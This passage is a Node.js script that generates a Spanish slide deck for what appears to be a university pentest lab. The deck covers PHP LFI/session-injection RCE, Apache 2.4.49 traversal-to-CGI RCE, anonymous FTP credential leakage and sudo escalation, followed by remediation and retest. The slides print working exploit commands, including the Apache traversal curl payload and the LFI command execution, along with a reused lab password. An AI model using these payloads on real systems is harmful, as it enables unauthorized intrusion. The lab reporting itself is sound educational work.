    ["3", "curl \"http://10.10.10.11:8080/lfi.php?f=/tmp/sess_<sid>\"", "El LFI incluye el archivo de sesión; PHP interpreta el código."],
    ["4", "curl \"http://10.10.10.11:8080/lfi.php?f=/tmp/sess_<sid>&c=id\"", "Ejecuta id y devuelve uid=33(www-data)."],
    ["5", "ssh ubuntu@10.10.10.11   # Admin13.-\nsudo id", "Reutiliza la clave de B3 y escala a root con sudo."],
  ];

  rows.forEach((r, i) => {
    const y = 1.7 + i * 0.88;
    if (i % 2 === 0) {
      s.addShape(pptx.ShapeType.rect, {
        x: M, y, w: 12.1, h: 0.8,
        fill: { color: PANEL }, line: { color: PANEL, width: 0 },
      });
    }
    badge(s, r[0], M + 0.12, y + 0.2, 0.4, i === 4 ? GREEN : NAVY, WHITE, 10);
    txt(s, r[1], {
      x: M + 0.68, y: y + 0.08, w: 6.2, h: 0.62,
      fontSize: 7.2, fontFace: "Courier New", color: INK, lineSpacing: 9,
    });
    txt(s, r[2], {
      x: 7.2, y: y + 0.1, w: 5.4, h: 0.55,
      fontSize: 8.2, color: MUTED, lineSpacing: 10.5,
    });
  });

  card(s, M, 6.15, 12.1, 0.6, NAVY, NAVY, 0.14);
  txt(s, "La sesión se crea con upload_progress; el LFI la incluye; el comando se ejecuta como www-data. Después se escala por B3/SSH/sudo.", {
    x: M + 0.22, y: 6.15, w: 11.7, h: 0.6,
    fontSize: 8.8, bold: true, color: WHITE, valign: "middle",
  });

  footer(s, 15);
  s.addNotes("Comandos de Chain A. Ejecutar en vivo desde Kali o M1. Paso 1 crea la sesión; paso 3 incluye el archivo; paso 4 ejecuta id; paso 5 escala con la clave de B3 y sudo.");
}

// =====================================================================
// W3 · APACHE RCE
// =====================================================================
{
  const s = newSlide(WHITE, "M1 · Erick Ramos Vera");
  header(s, "Fase 3 · Otra vía · W3", "Apache 2.4.49: traversal y RCE",
    "Un segundo camino a www-data, independiente de PHP2Shell.");

  txt(s, "Qué se explota", {
    x: M, y: 1.7, w: 5.5, h: 0.28,
    fontSize: 14, bold: true, color: NAVY,
  });
  txt(s, "Apache 2.4.49 permite traversal de rutas. Con CGI habilitado, la ruta llega a /bin/sh y ejecuta comandos como el usuario del servicio.", {
    x: M, y: 2.05, w: 5.4, h: 1.0,
    fontSize: 10.5, color: INK, lineSpacing: 15,
  });

  s.addShape(pptx.ShapeType.roundRect, {
    x: M, y: 3.15, w: 6.3, h: 1.65,
    fill: { color: "071A2E" }, line: { color: "071A2E", width: 0 }, rectRadius: 0.14,
  });
  txt(s, "curl --path-as-is 'http://10.10.10.11:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \\", {
    x: M + 0.2, y: 3.3, w: 6.0, h: 0.22,
    fontSize: 7.6, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "  -d 'echo Content-Type: text/plain; echo; id'", {
    x: M + 0.2, y: 3.55, w: 6.0, h: 0.22,
    fontSize: 7.6, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "uid=33(www-data) gid=33(www-data) groups=33(www-data)", {
    x: M + 0.2, y: 4.0, w: 6.0, h: 0.24,
    fontSize: 8, bold: true, fontFace: "Courier New", color: "A7F3D0",
  });

  card(s, 7.2, 1.7, 5.5, 3.1, WHITE, BORDER, 0.14);
  txt(s, "Lectura", {
    x: 7.42, y: 1.85, w: 5.0, h: 0.26,
    fontSize: 11, bold: true, color: NAVY,
  });
  ["Apache 2.4.49 con CGI operativo.", "El traversal llega a /bin/sh.", "El comando se ejecuta como www-data.", "Evidencia: EV-005-M1-03."].forEach((t, i) => {
    txt(s, "•  " + t, {
      x: 7.42, y: 2.25 + i * 0.42, w: 5.0, h: 0.3,
      fontSize: 8.8, color: MUTED,
    });
  });

  txt(s, "W3 y W2 llegan al mismo nivel; se usan como rutas alternativas y se parchean por separado.", {
    x: M, y: 5.15, w: 12.0, h: 0.4,
    fontSize: 9, italic: true, color: MUTED,
  });

  footer(s, 16);
  s.addNotes("W3. Mostrar el curl con traversal y CGI. La salida es www-data. Es la segunda vía a M1 y sirve de respaldo si PHP2Shell fallara en la demo.");
}

// =====================================================================
// B3 · FTP ANONIMO
// =====================================================================
{
  const s = newSlide(WHITE, "M3 · Rony Churata Huacani");
  header(s, "Fase 3 · Otra vía · B3", "FTP anónimo: la llave maestra",
    "De un backup en M3 a root en M1 por reutilización de credenciales.");

  txt(s, "Qué se explota", {
    x: M, y: 1.7, w: 5.5, h: 0.28,
    fontSize: 14, bold: true, color: NAVY,
  });
  txt(s, "El FTP de M3 permite acceso anónimo y expone /backups. Dentro está credenciales.txt con la clave Admin13.-, la misma que usa ubuntu en M1.", {
    x: M, y: 2.05, w: 5.4, h: 1.0,
    fontSize: 10.5, color: INK, lineSpacing: 15,
  });

  s.addShape(pptx.ShapeType.roundRect, {
    x: M, y: 3.15, w: 6.3, h: 1.55,
    fill: { color: "071A2E" }, line: { color: "071A2E", width: 0 }, rectRadius: 0.14,
  });
  txt(s, "curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt", {
    x: M + 0.2, y: 3.3, w: 6.0, h: 0.22,
    fontSize: 7.4, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "admin M4/M5: Admin13.-", {
    x: M + 0.2, y: 3.65, w: 6.0, h: 0.24,
    fontSize: 9, bold: true, fontFace: "Courier New", color: "A7F3D0",
  });
  txt(s, "ssh ubuntu@10.10.10.11   # Admin13.-   →   sudo id   →   uid=0(root)", {
    x: M + 0.2, y: 4.05, w: 6.0, h: 0.24,
    fontSize: 7.4, fontFace: "Courier New", color: "D7E6F2",
  });

  card(s, 7.2, 1.7, 5.5, 3.1, WHITE, BORDER, 0.14);
  txt(s, "Lectura", {
    x: 7.42, y: 1.85, w: 5.0, h: 0.26,
    fontSize: 11, bold: true, color: NAVY,
  });
  ["FTP anónimo en M3.", "credenciales.txt en claro.", "La clave se reutiliza en ubuntu.", "sudo lleva a root; evidencia EV-ROOT-CHAIN."].forEach((t, i) => {
    txt(s, "•  " + t, {
      x: 7.42, y: 2.25 + i * 0.42, w: 5.0, h: 0.3,
      fontSize: 8.8, color: MUTED,
    });
  });

  txt(s, "Esta es la cadena que convierte www-data en root: no es un exploit nuevo, es reutilización de credenciales.", {
    x: M, y: 5.15, w: 12.0, h: 0.4,
    fontSize: 9, italic: true, color: MUTED,
  });

  footer(s, 17);
  s.addNotes("B3. Mostrar la descarga de credenciales.txt y la reutilización en ubuntu. Luego sudo id. Es el paso que lleva de www-data a root en la demo.");
}

// =====================================================================
// 17. EVIDENCIA
// =====================================================================
{
  const s = newSlide(WHITE, "M6 · Jose Paye Mamani");
  header(s, "Fase 3 · Evidencia", "Lo que quedó demostrado",
    "Log, captura y SHA256; evidencia verificable.");

  const imgs = [
    {
      file: path.join(IMG, "EV-W2-07.png"),
      title: "EV-W2-07 · Chain A RCE",
      desc: "session injection + LFI → uid=33(www-data) desde M1.",
      hash: "e9916fa598a6f11f…",
    },
    {
      file: path.join(IMG, "EV-W2-09.png"),
      title: "EV-W2-09 · root y marcador",
      desc: "B3 → credenciales → SSH ubuntu → sudo → /root/PWNED-M1-root.txt.",
      hash: "30ebe1ebb93b76a9…",
    },
  ];

  imgs.forEach((im, i) => {
    const x = M + i * 6.2;
    card(s, x, 1.72, 5.95, 4.15, WHITE, BORDER, 0.1);
    txt(s, im.title, {
      x: x + 0.18, y: 1.85, w: 5.5, h: 0.24,
      fontSize: 10, bold: true, color: NAVY,
    });
    addImageContain(s, im.file, x + 0.18, 2.15, 5.55, 2.95);
    txt(s, im.desc, {
      x: x + 0.18, y: 5.2, w: 5.55, h: 0.35,
      fontSize: 8.2, color: MUTED, lineSpacing: 10.5,
    });
    txt(s, "SHA256  " + im.hash, {
      x: x + 0.18, y: 5.57, w: 5.5, h: 0.2,
      fontSize: 7.2, fontFace: "Courier New", color: CYAN,
    });
  });

  card(s, M, 6.08, 12.1, 0.62, NAVY, NAVY, 0.08);
  txt(s, "W3 · EV-005-M1-03 y W2 Chain A · EV-W2-07/08 son los RCE reales de M1; root se cierra por B3/SSH/sudo.", {
    x: M + 0.22, y: 6.08, w: 11.7, h: 0.62,
    fontSize: 9.5, bold: true, color: WHITE, valign: "middle",
  });

  footer(s, 15);
  s.addNotes("Evidencia. EV-W2-07 documenta Chain A y www-data. EV-W2-09 documenta la cadena B3, SSH y sudo hasta root. Cada evidencia tiene log, captura y SHA256.");
}

// =====================================================================
// 16. IMPACTO Y CADENA
// =====================================================================
{
  const s = newSlide(WHITE, "M6 · Jose Paye Mamani");
  header(s, "Fase 3 · Impacto", "Qué se obtuvo",
    "W2 sí dio www-data por Chain A; root se cierra con B3, SSH y sudo.");

  // Tabla de vectores
  const rows = [
    ["W2 · PHP2Shell", "RCE www-data (Chain A)", "uid=33(www-data)", GREEN],
    ["W3 · Apache 2.4.49", "RCE www-data", "uid=33(www-data)", GREEN],
    ["B3 + M1-SSH · sudo", "root", "uid=0(root)", GREEN],
  ];
  rows.forEach((r, i) => {
    const y = 1.9 + i * 1.15;
    card(s, M, y, 7.0, 0.78, i === 0 ? "ECFDF5" : PANEL, i === 0 ? "A7F3D0" : BORDER, 0.14);
    txt(s, r[0], {
      x: M + 0.22, y: y + 0.1, w: 2.55, h: 0.22,
      fontSize: 9.5, bold: true, color: NAVY,
    });
    txt(s, r[1], {
      x: M + 2.85, y: y + 0.1, w: 2.0, h: 0.22,
      fontSize: 8.2, color: MUTED,
    });
    txt(s, r[2], {
      x: M + 4.9, y: y + 0.1, w: 1.95, h: 0.22,
      fontSize: 8.5, bold: true, color: r[3],
    });
    if (i === 0) {
      txt(s, "✓", {
        x: M + 6.55, y: y + 0.06, w: 0.3, h: 0.3,
        fontSize: 18, bold: true, color: GREEN, align: "center",
      });
    }
  });

  // Cadena
  txt(s, "Cadena real para root", {
    x: 8.0, y: 1.8, w: 4.5, h: 0.26,
    fontSize: 12, bold: true, color: NAVY,
  });
  const chain = [
    ["M6", "Kali · auditoría", NAVY],
    ["M1", "W3 / W2 Chain A → www-data", CYAN],
    ["ubuntu", "SSH · Admin13.-", NAVY2],
    ["root", "sudo id → uid=0", GREEN],
  ];
  chain.forEach((c, i) => {
    const y = 2.25 + i * 1.05;
    s.addShape(pptx.ShapeType.roundRect, {
      x: 8.0, y, w: 4.5, h: 0.75,
      fill: { color: c[2] },
      line: { color: c[2], width: 0 },
      rectRadius: 0.08,
    });
    txt(s, c[0], {
      x: 8.2, y: y + 0.1, w: 1.7, h: 0.25,
      fontSize: 12, bold: true, color: WHITE,
    });
    txt(s, c[1], {
      x: 8.2, y: y + 0.38, w: 4.1, h: 0.22,
      fontSize: 8.2, color: "E6F7FB",
    });
    if (i < 3) {
      s.addShape(pptx.ShapeType.line, {
        x: 10.25, y: y + 0.75, w: 0, h: 0.3,
        line: { color: "9DB4C8", width: 1.5, endArrowType: "triangle" },
      });
    }
  });

  txt(s, "W2 llega a www-data; root no proviene de W2: se cierra por B3 → SSH → sudo.", {
    x: 8.0, y: 6.45, w: 4.6, h: 0.4,
    fontSize: 8.2, italic: true, color: MUTED, lineSpacing: 10.5,
  });

  card(s, M, 5.7, 7.0, 0.85, ICE, ICE, 0.08);
  txt(s, "La diferencia entre “hay un CVE” y “se explotó” está en la evidencia: id, archivo o captura verificable.", {
    x: M + 0.22, y: 5.7, w: 6.6, h: 0.85,
    fontSize: 8.8, bold: true, color: NAVY, valign: "middle", lineSpacing: 12,
  });

  footer(s, 16);
  s.addNotes("Impacto. W2 dio www-data por Chain A; W3 también dio www-data; root se cierra por B3, SSH y sudo. La cadena real está documentada y no se atribuye a W2.");
}

// =====================================================================
// 18. CADENA COMPLETA A ROOT
// =====================================================================
{
  const s = newSlide(WHITE, "M1 Erick · M3 Rony · M6 Jose");
  header(s, "Fase 3 · Cadena completa", "De Kali a root: cinco eslabones",
    "Cada paso se ejecuta en vivo y deja evidencia: W2, B3, SSH, sudo y marcadores.");

  const chain = [
    ["1", "Kali → M1", "W2 Chain A", "session injection + inclusión de sesión", CYAN],
    ["2", "M1 · www-data", "RCE", "id + PWNED-M1-www-data", NAVY2],
    ["3", "M3 · FTP", "B3", "credenciales.txt: Admin13.-", NAVY2],
    ["4", "M1 · ubuntu", "SSH", "misma clave reutilizada", NAVY2],
    ["5", "M1 · root", "sudo", "uid=0 + PWNED-M1-root.txt", GREEN],
  ];

  chain.forEach((c, i) => {
    const x = 0.55 + i * 2.55;
    card(s, x, 1.85, 2.3, 3.1, i === 4 ? "ECFDF5" : WHITE, i === 4 ? "A7F3D0" : BORDER, 0.14);
    badge(s, c[0], x + 0.18, 2.0, 0.45, i === 0 ? CYAN : i === 4 ? GREEN : NAVY, WHITE, 12);
    txt(s, c[1], {
      x: x + 0.18, y: 2.58, w: 1.95, h: 0.24,
      fontSize: 10.5, bold: true, color: NAVY,
    });
    chip(s, c[2], x + 0.18, 2.92, 0.85, ICE, NAVY, 7.5);
    txt(s, c[3], {
      x: x + 0.18, y: 3.35, w: 1.95, h: 1.1,
      fontSize: 8.3, color: MUTED, lineSpacing: 11,
    });
    if (i < 4) {
      s.addShape(pptx.ShapeType.line, {
        x: x + 2.3, y: 3.15, w: 0.24, h: 0,
        line: { color: CYAN, width: 2, endArrowType: "triangle" },
      });
    }
  });

  card(s, M, 5.35, 12.15, 0.8, NAVY, NAVY, 0.14);
  txt(s, "Resultado: RCE www-data + root, con marcadores y capturas EV-W2-07/08/09 y EV-ROOT-CHAIN.", {
    x: M + 0.25, y: 5.35, w: 11.65, h: 0.8,
    fontSize: 10.5, bold: true, color: WHITE, valign: "middle",
  });

  txt(s, "La réplica en vivo sigue el mismo orden: versión, precondiciones, PoC, evidencia y retest.", {
    x: M, y: 6.35, w: 12.0, h: 0.3,
    fontSize: 8.8, italic: true, color: MUTED,
  });

  footer(s, 18);
  s.addNotes("Cadena completa. Paso 1: W2 Chain A en M1. Paso 2: www-data y marcador. Paso 3: B3 en M3 entrega Admin13.-. Paso 4: SSH ubuntu en M1. Paso 5: sudo y root. Todo se puede ejecutar en vivo desde Kali.");
}

// =====================================================================
// 19. OTROS HALLAZGOS
// =====================================================================
{
  const s = newSlide(WHITE, "M2 Doris · M3 Rony · M4 Fabiola · M5 Marco");
  header(s, "Fase 3 · Resto de la red", "Los hallazgos que sostienen la cadena",
    "Configuraciones y CVE que sí se demostraron en M2–M5.");

  const groups = [
    ["M2 · Base de datos", ["Redis sin autenticación", "Claves de BD en wp-config", "Volcado: 12 y 487 tablas", "Pivote desde M1"], NAVY3],
    ["M3 · Respaldos", ["FTP anónimo + credenciales.txt", "NFS no_root_squash", "Admin13.- reutilizada", "Salto a M1/M4/M5"], NAVY3],
    ["M4 · Windows Server", ["Admin password_2026 (Pwn3d!)", "AXFR de uni.lab", "SYSTEM por tarea programada", "Shares ADMIN$/C$"], NAVY3],
    ["M5 · Cliente", ["VNC sin autenticación", "whoami: desktop-dt5f05n\\cliente", "Clave reutilizada por SMB", "Marcador PWNED-M5"], NAVY3],
  ];

  groups.forEach((g, i) => {
    const col = i % 2;
    const row = Math.floor(i / 2);
    const x = M + col * 6.15;
    const y = 1.75 + row * 2.4;
    card(s, x, y, 5.95, 2.12, WHITE, BORDER, 0.1);
    s.addShape(pptx.ShapeType.roundRect, {
      x: x + 0.18, y: y + 0.16, w: 0.5, h: 0.3,
      fill: { color: g[2] },
      line: { color: g[2], width: 0 },
      rectRadius: 0.05,
    });
    txt(s, g[0].slice(0, 2), {
      x: x + 0.18, y: y + 0.16, w: 0.5, h: 0.3,
      fontSize: 9, bold: true, color: WHITE, align: "center", valign: "middle",
    });
    txt(s, g[0].split("· ")[1], {
      x: x + 0.82, y: y + 0.16, w: 4.8, h: 0.26,
      fontSize: 12, bold: true, color: NAVY,
    });
    g[1].forEach((item, j) => {
      txt(s, "•  " + item, {
        x: x + 0.22, y: y + 0.62 + j * 0.31, w: 5.5, h: 0.24,
        fontSize: 8.5, color: MUTED,
      });
    });
    chip(s, i === 3 ? "Pendiente" : "Retest: cerrado", x + 4.45, y + 1.72, 1.3,
      i === 3 ? "FEF3C7" : "DCFCE7", i === 3 ? "92400E" : "166534", 7);
  });

  card(s, M, 6.45, 12.1, 0.52, ICE, ICE, 0.08);
  txt(s, "W2 y W3 son los RCE demostrados en M1; M4 llegó a SYSTEM con credenciales admin, no por privesc desde acceso limitado.", {
    x: M + 0.22, y: 6.45, w: 11.7, h: 0.52,
    fontSize: 9, bold: true, color: NAVY, valign: "middle",
  });

  footer(s, 17);
  s.addNotes("Otros hallazgos. Recorrer M2–M5 en 30 segundos cada uno. Aclarar que M4 llegó a SYSTEM con credenciales de admin; no cuenta como privesc desde acceso limitado.");
}

// =====================================================================
// 18. REMEDIACIÓN POR MAQUINA
// =====================================================================
{
  const s = newSlide();
  header(s, "Fase 4 · Remediación", "Qué cambió en cada máquina",
    "Versión y configuración aplicadas; M5 queda pendiente.");

  txt(s, "MÁQUINA", { x: M + 0.1, y: 1.72, w: 1.3, h: 0.22, fontSize: 7.2, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "ANTES", { x: 2.25, y: 1.72, w: 2.8, h: 0.22, fontSize: 7.2, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "DESPUÉS / CONFIGURACIÓN", { x: 6.0, y: 1.72, w: 5.4, h: 0.22, fontSize: 7.2, bold: true, color: CYAN, charSpacing: 0.8 });
  txt(s, "ESTADO", { x: 11.55, y: 1.72, w: 1.0, h: 0.22, fontSize: 7.2, bold: true, color: CYAN, charSpacing: 0.8 });

  const rows = [
    ["M1", "PHP 8.4.26 · WP 7.0.1\nApache 2.4.49",
      "PHP 8.4.27 · WP 7.0.2 · Apache 2.4.51\nupload_progress Off · LFI fuera", "Aplicado", "V+C"],
    ["M2", "Redis 6.2.6 · 6379 abierto",
      "Redis 6.2.7 · requirepass · UFW\nclaves de BD rotadas", "Aplicado", "V+C"],
    ["M3", "FTP anónimo · NFS rw",
      "FTP off · root_squash\nSSH rotado · SMB2", "Aplicado", "CFG"],
    ["M4", "SMBv1 · signing off · AXFR",
      "SMB1 off · signing on\nSpooler off · AXFR cerrado", "Aplicado", "CFG"],
    ["M5", "VNC/RDP/SMB abiertos",
      "445/3389/5900 filtrados", "Pendiente", "—"],
  ];

  rows.forEach((r, i) => {
    const y = 2.02 + i * 0.82;
    if (i % 2 === 0) {
      s.addShape(pptx.ShapeType.rect, {
        x: M, y, w: 12.1, h: 0.74,
        fill: { color: PANEL }, line: { color: PANEL, width: 0 },
      });
    }
    txt(s, r[0], {
      x: M + 0.1, y: y + 0.12, w: 1.3, h: 0.26,
      fontSize: 10, bold: true, color: NAVY,
    });
    txt(s, r[4], {
      x: M + 0.12, y: y + 0.43, w: 1.2, h: 0.2,
      fontSize: 6.2, bold: true, color: CYAN,
    });
    txt(s, r[1], {
      x: 2.25, y: y + 0.08, w: 3.4, h: 0.55,
      fontSize: 7.4, color: INK, lineSpacing: 9.5,
    });
    txt(s, r[2], {
      x: 6.0, y: y + 0.08, w: 5.3, h: 0.58,
      fontSize: 7.4, color: INK, lineSpacing: 9.5,
    });
    chip(s, r[3], 11.3, y + 0.16, 1.3,
      r[3] === "Pendiente" ? "FEF3C7" : "DCFCE7",
      r[3] === "Pendiente" ? "92400E" : "166534", 7.2);
  });

  card(s, M, 6.35, 12.1, 0.55, ICE, ICE, 0.08);
  txt(s, "El parcheo se aplicó en cada servidor; M1–M4 cerrados, M5 pendiente. V+C = versión + configuración; CFG = solo configuración.", {
    x: M + 0.22, y: 6.35, w: 11.7, h: 0.55,
    fontSize: 8.8, bold: true, color: NAVY, valign: "middle",
  });

  footer(s, 18);
  s.addNotes("Remediación. Recorrer la tabla por máquina: versión antes, versión/configuración después y estado. M1–M4 cerrados; M5 filtrado y pendiente.");
}

// =====================================================================
// 19. RETEST CON COMANDOS
// =====================================================================
{
  const s = newSlide();
  header(s, "Fase 5 · Retest", "Comandos de verificación",
    "Los mismos comandos, ahora sobre el servicio corregido.");

  const cols = [
    ["M1", "OK", ["php -v", "→ 8.4.27", "curl /lfi.php", "→ 404", "WP 7.0.2"], CYAN],
    ["M2", "OK", ["redis-cli PING", "→ NOAUTH", "nmap -p6379", "→ filtered"], NAVY3],
    ["M3", "OK", ["curl ftp://…", "→ 530", "showmount -e", "→ root_squash"], NAVY3],
    ["M4", "OK", ["nxc smb", "→ signing:True", "dig axfr", "→ failed"], NAVY3],
    ["M5", "PENDIENTE", ["nmap -p445,3389,5900", "→ filtered", "sin cambios"], AMBER],
  ];

  cols.forEach((c, i) => {
    const x = 0.5 + i * 2.5;
    card(s, x, 1.75, 2.3, 3.45, WHITE, BORDER, 0.14);
    txt(s, c[0], {
      x: x + 0.16, y: 1.9, w: 1.0, h: 0.3,
      fontSize: 16, bold: true, color: c[4],
    });
    txt(s, c[1], {
      x: x + 0.16, y: 2.28, w: 2.0, h: 0.22,
      fontSize: 8.4, bold: true, color: c[1] === "PENDIENTE" ? AMBER : GREEN,
    });
    c[2].forEach((line, j) => {
      txt(s, line, {
        x: x + 0.16, y: 2.65 + j * 0.34, w: 2.0, h: 0.3,
        fontSize: 6.9, fontFace: "Courier New",
        color: line.startsWith("→") ? "166534" : MUTED,
        lineSpacing: 8.5,
      });
    });
    txt(s, ["versión y LFI", "auth y puerto", "FTP y NFS", "SMB y DNS", "sigue filtrado"][i], {
      x: x + 0.16, y: 4.55, w: 2.0, h: 0.5,
      fontSize: 7, italic: true, color: MUTED, lineSpacing: 9,
    });
  });

  card(s, M, 5.45, 12.1, 0.6, PANEL, BORDER, 0.12);
  txt(s, "M1–M4 verificados con los mismos comandos; M5 sigue filtrado y se declara pendiente, no remediado.", {
    x: M + 0.22, y: 5.45, w: 11.7, h: 0.6,
    fontSize: 9, bold: true, color: INK, valign: "middle",
  });

  txt(s, "El retest no se basa en la versión: repite el comando y compara la salida.", {
    x: M, y: 6.35, w: 12.0, h: 0.3,
    fontSize: 8.8, italic: true, color: MUTED,
  });

  footer(s, 19);
  s.addNotes("Retest con comandos. M1: php 8.4.27 y lfi 404. M2: NOAUTH y puerto filtrado. M3: FTP 530 y root_squash. M4: signing True y AXFR falla. M5: puertos filtrados, pendiente.");
}

// =====================================================================
// 20. LECCIONES
// =====================================================================
{
  const s = newSlide();
  header(s, "Fase 5 · Cierre", "Cuatro lecciones de PHP2Shell",
    "Lo que este caso enseña sobre versiones, PoCs y evidencia.");

  const lessons = [
    ["01", "La versión es el punto de partida", "PHP 8.4.26 habilitó la cadena; el build NTS/prefork y los offsets reales permitieron ejecutar el exploit."],
    ["02", "Los offsets son del binario", "Copiar offsets de un writeup de Debian 12 hace fallar el PoC en Ubuntu 22.04. Se derivan con nm del libphp.so real."],
    ["03", "W2 + B3 = root", "Chain A dio www-data; B3 expuso Admin13.-, SSH entró como ubuntu y sudo llegó a root. Cada eslabón tiene evidencia."],
    ["04", "Parchear sí cambia el juego", "PHP 8.4.27, upload_progress Off y LFI eliminado se verificaron en EV-007-RETEST; mitigar por configuración ya no fue suficiente."],
  ];

  lessons.forEach((l, i) => {
    const col = i % 2;
    const row = Math.floor(i / 2);
    const x = M + col * 6.15;
    const y = 1.8 + row * 2.25;
    card(s, x, y, 5.9, 1.95, WHITE, BORDER, 0.1);
    txt(s, l[0], {
      x: x + 0.22, y: y + 0.15, w: 0.8, h: 0.55,
      fontSize: 28, bold: true, color: CYAN,
    });
    txt(s, l[1], {
      x: x + 1.0, y: y + 0.2, w: 4.65, h: 0.3,
      fontSize: 12.5, bold: true, color: NAVY,
    });
    txt(s, l[2], {
      x: x + 1.0, y: y + 0.6, w: 4.6, h: 1.15,
      fontSize: 9.2, color: MUTED, lineSpacing: 12.5,
    });
  });

  txt(s, "La fortaleza del trabajo no es “todos los CVE explotados”, sino la trazabilidad de qué se demostró, qué no y por qué.", {
    x: M, y: 6.5, w: 12.0, h: 0.4,
    fontSize: 9.2, italic: true, color: MUTED, align: "center",
  });

  footer(s, 20);
  s.addNotes("Lecciones. Cerrar con las cuatro ideas. La más importante: el fallo documentado vale más que un éxito inventado. Y mitigar por configuración no es parchear la versión.");
}

// =====================================================================
// 21. CIERRE
// =====================================================================
{
  const s = newSlide(NAVY);
  s.addShape(pptx.ShapeType.ellipse, {
    x: 10.2, y: 4.6, w: 4.2, h: 4.2,
    fill: { color: CYAN, transparency: 86 },
    line: { color: CYAN, width: 1, transparency: 60 },
  });

  txt(s, "GRACIAS", {
    x: M, y: 1.55, w: 6, h: 0.3,
    fontSize: 11, bold: true, color: CYAN_L, charSpacing: 3,
  });
  txt(s, "Preguntas y réplica en vivo", {
    x: M, y: 1.95, w: 8.5, h: 0.9,
    fontSize: 38, bold: true, color: WHITE,
  });
  txt(s, "La demo sigue el orden del informe: version gate, precondiciones, PoC, evidencia y retest.", {
    x: M, y: 3.0, w: 8.0, h: 0.5,
    fontSize: 12, color: "A9C4D8", lineSpacing: 17,
  });

  const close = [
    ["W2", "Chain A RCE www-data · parcheado 8.4.27", "A7F3D0"],
    ["W3", "RCE real como www-data", "A7F3D0"],
    ["ROOT", "ubuntu/Admin13.- + sudo", "BAE6FD"],
  ];
  close.forEach((c, i) => {
    const y = 3.9 + i * 0.72;
    s.addShape(pptx.ShapeType.roundRect, {
      x: M, y, w: 6.4, h: 0.58,
      fill: { color: "10325A" },
      line: { color: "2A5B84", width: 1 },
      rectRadius: 0.06,
    });
    txt(s, c[0], {
      x: M + 0.2, y: y + 0.05, w: 0.9, h: 0.25,
      fontSize: 10, bold: true, color: CYAN_L,
    });
    txt(s, c[1], {
      x: M + 1.1, y: y + 0.05, w: 5.1, h: 0.25,
      fontSize: 9.5, color: WHITE,
    });
  });

  footer(s, 22, true);  s.addNotes("Cierre. Dejar tres ideas: W2 logró RCE por Chain A, la condición LFI se declara, y M1–M4 quedaron parcheados y retestados. Abrir preguntas y pasar a la réplica.");
}


// ---------- Guardar ----------
pptx.writeFile({ fileName: path.join(__dirname, "PHP2Shell-IS1023.pptx") })
  .then((f) => console.log("OK:", f))
  .catch((e) => { console.error(e); process.exit(1); });
